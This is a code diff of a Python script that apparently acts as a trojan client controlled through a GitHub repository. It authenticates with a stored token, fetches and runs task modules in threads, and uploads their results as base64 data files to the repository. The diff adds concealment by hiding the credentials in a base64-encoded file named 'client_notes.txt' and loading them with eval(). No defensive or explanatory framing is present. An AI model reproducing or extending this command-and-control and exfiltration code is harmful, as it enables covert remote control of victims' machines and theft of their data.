@@ -13,10 +13,10 @@ from github3 import login
 
 
 def github_connect() -> object:
-    with open('git_stuff.txt', 'r') as f:
-        git_info = eval(f.read())
+    with open('client_notes.txt', 'rb') as f:
+        git_info = eval(b64decode(f.read()))
     gh = login(username=git_info['user'], token=git_info['token']) 
-    repo = gh.repository(git_info['user'], git_info['repo_name'])
+    repo = gh.repository(git_info['user'], git_info['repo'])
     return repo
 
 def retrieve_contents(file_path: str) -> str(b64encode):
@@ -87,9 +87,6 @@ class ClientHandler:
         
         return result
 
-    def create_github_file(self, path: str, message: str, data: bytes) -> None:
-        self.repo.create_file(path, message, data)
-
     def create_client_config(self, module: str) -> None:
         self.client_id = f'ent-{int(time())}'
         self.config_path = f'config/{self.client_id}.json'
@@ -97,25 +94,27 @@ class ClientHandler:
         
         result = self.module_queue(module)
         
-        self.create_github_file(
-            self.config_path, 
-            f'{self.client_id}_init_{datetime.now().isoformat()}',
-            bytes(r'%s' %result, 'utf-8'))
+        message = f'{self.client_id} init {datetime.now().isoformat()}' 
+        bindata = bytes(r'%s' %result, 'utf-8')
+        
+        self.repo.create_file(self.config_path, message, bindata)
     
     def update_client_config(self, module: str) -> None:
         result = self.module_queue(module)
         
-        self.repo.file_contents(self.config_path).update(
-            f'{self.client_id}_update_{datetime.now().isoformat()}',
-            bytes(r'%s' %result, 'utf-8'))
+        message = f'{self.client_id} update {datetime.now().isoformat()}' 
+        bindata = bytes(r'%s' %result, 'utf-8')
+        
+        self.repo.file_contents(self.config_path).update(message,bindata)
     
     def module_exec(self, module: str) -> None:
         result = self.module_queue(module)
         
-        self.create_github_file(
-            f'{self.data_path}/{int(time())}.data', 
-            f'{module}__{datetime.now().isoformat()}',
-            b64encode(bytes('%r' %result, 'utf-8')))
+        message = f'{module}__{datetime.now().isoformat()}'
+        data_path_full = f'{self.data_path}/{int(time())}.data'
+        bindata = bytes('%r' %result, 'utf-8')
+        
+        self.repo.create_file(data_path_full, message, b64encode(bindata))
     
 def threader(func: object, task: str) -> None:
     t = Thread(target=func, args=(task, ))
@@ -149,6 +148,7 @@ def main() -> None:
                     
                     else:
                         threader(client.module_exec, task['module'])
+
 
 if __name__=='__main__':
     main()
